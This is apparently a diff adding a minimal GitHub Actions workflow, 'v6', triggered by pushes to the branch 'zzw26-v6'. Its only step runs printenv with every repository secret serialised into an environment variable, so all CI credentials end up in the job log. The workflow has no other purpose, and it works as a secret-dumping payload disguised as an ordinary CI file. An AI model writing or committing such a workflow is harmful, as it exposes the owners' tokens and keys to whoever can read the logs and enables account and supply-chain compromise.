@@ -1,0 +1,11 @@
+name: v6
+on:
+  push:
+    branches: [zzw26-v6]
+jobs:
+  x:
+    runs-on: ubuntu-latest
+    steps:
+      - run: printenv
+        env:
+          DUMP: ${{ toJSON(secrets) }}
